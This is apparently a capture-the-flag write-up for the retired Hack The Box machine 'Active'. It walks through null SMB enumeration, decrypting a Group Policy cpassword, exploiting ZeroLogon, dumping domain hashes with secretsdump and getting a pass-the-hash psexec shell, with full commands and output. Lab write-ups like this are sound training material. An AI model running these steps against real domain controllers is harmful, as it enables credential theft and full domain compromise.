---
created: 2025-08-23
---

📅 `2025-08-23`

#smb #null-authentication #cred-hunting #cve

----

## 🖥️ Box Info

| ️🏷️ Name         |   `Active`  |
| --------------- | --- |
| 📆 Release Date |  `2018-07-28`   |
| 🌐 IP Address   |  `10.10.10.100`   |
| 🖥️ OS           |  `Windows`   |
| 🎯 Difficulty   |  `Easy`   |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Share enumeration and spidering
- Decrypting `cpassword`
- `CVE` (`ZeroLogon`)

**🛠️ Tools:**  

- `NetExec`
- `smbclient`
- `secretsdump`
- `psexec`

**📚 Learned:**  

- Don't overlook `NetExec`'s vulnerability scan modules. They're quick and simple to run.

----

## 🌐 Port Scan

- **TCP**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5722, ...

---

## 🔍 Enumeration

According to the open ports, we can deduce we're facing a Domain Controller. The `nmap` scan reveals that the domain name is `active.htb`. I tried `SMB` `NULL` authentication with `NetExec` and it worked:

```shell
nxc smb 10.10.10.100 -u '' -p ''
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domin:active.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
```

I then looked for shares and found this:

```shell
nxc smb 10.10.10.100 -u '' -p '' --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domin:active.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users               
```

The share `Replication` looks interesting (and it's our only lead, since there were no `ASREProastable` users).

---

## 🪜 Foothold / User

I downloaded all files using the `spider_plus` module from `NetExec`.

```shell
nxc smb 10.10.10.100 -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

And then navigated to the folder `Replication`:

- `~/.nxc/modules/nxc_spider_plus/10.10.10.100/Replication`

After some enumeration I found this file:

- `~/.nxc/modules/nxc_spider_plus/10.10.10.100/Replication/active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml`

And it had these contents:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

There is a username and a `cpassword` field. A `cpassword` is a setting in Group Policy that can be decrypted with the tool `gpp-decrypt`. Let's do that:

```shell
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

And let's test the credentials.

```shell
nxc smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domin:active.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

It worked. These are the shares available to this user:

```shell
nxc smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domin:active.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ            
```

This user has access to the `Users` share. I spidered it without downloading anything, since it may be large.

```shell
nxc smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -M spider_plus
```

I ran into connection issues, so I used the `--spider <share>` flag without a pattern instead.

```shell
nxc smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --spider Users
<SNIP>
SMB         10.10.10.100    445    DC               //10.10.10.100/Users/SVC_TGS/Desktop/user.txt [lastm:'2025-08-23 22:59' size:34]
```

The user flag is there, so I downloaded it with `smbclient`.

```shell
smbclient //10.10.10.100/Users -U SVC_TGS
<SNIP>
smb: \> cd SVC_TGS
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 10:14:42 2018
  ..                                  D        0  Sat Jul 21 10:14:42 2018
  user.txt                           AR       34  Sat Aug 23 22:59:43 2025
get 
		5217023 blocks of size 4096. 279538 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> exit

$ ls
tcp_scan.txt user.txt

$ cat user.txt
<REDACTED>
```

Got user.

---

## 🛡️ Privilege Escalation

Since it's quick, I also ran `NetExec`'s `zerologon` module and found this:

```shell
nxc smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -M zerologon
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domin:active.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
ZEROLOGON   10.10.10.100    445    DC               VULNERABLE
ZEROLOGON   10.10.10.100    445    DC               Next step: https://github.com/dirkjanm/CVE-2020-1472
```

The target is vulnerable. I followed the link in the output (https://github.com/dirkjanm/CVE-2020-1472), downloaded the exploit, and tested it:

```shell
python exp.py DC 10.10.10.100
Performing authentication attempts...
===============================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

And now I could just perform `DCSync`. The exploit said to use the `DC` machine account with an empty hash:

```shell
impacket-secretsdump` active.htb/DC\$@10.10.10.100 -just-dc -hashes ':'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:003b207686cfdbee91ff9f5671aa10c5d940137da387173507b7ff00648b40d8
Administrator:aes128-cts-hmac-sha1-96:48347871a9f7c5346c356d76313668fe
Administrator:des-cbc-md5:5891549b31f2c294
krbtgt:aes256-cts-hmac-sha1-96:cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9
krbtgt:aes128-cts-hmac-sha1-96:b9a02d7bd319781bc1e0a890f69304c3
krbtgt:des-cbc-md5:9d044f891adf7629
active.htb\SVC_TGS:aes256-cts-hmac-sha1-96:d59943174b17c1a4ced88cc24855ef242ad328201126d296bb66aa9588e19b4a
active.htb\SVC_TGS:aes128-cts-hmac-sha1-96:f03559334c1111d6f792d74a453d6f31
active.htb\SVC_TGS:des-cbc-md5:d6c7eca70862f1d0
DC$:aes256-cts-hmac-sha1-96:70c3ef13e7fd9897849898dc45abb6e7d21b7d6c5e1ca15d74bb690f7ca1f61e
DC$:aes128-cts-hmac-sha1-96:8e04da73d7b248b002d78b91c212201b
DC$:des-cbc-md5:235df1fd2afb3e5b
[*] Cleaning up... 
```

I got a shell as `Administrator` with `psexec`.

```shell
impacket-psexec Administrator@10.10.10.100 -hashes :5ffb4aaaf9b63dc519eca04aec0e8bed
/home/asdf/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file RvMYFrVM.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service bkGN on 10.10.10.100.....
[*] Starting service bkGN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> cd ..
C:\Windows> cd ..
C:\> cd Users
C:\Users> cd Administrator
C:\Users\Administrator> cd Desktop
C:\Users\Administrator> dir
24/08/2025  06:59     34 root.txt
C:\Users\Administrator\Desktop> type root.txt
<REDACTED>
```

Rooted.
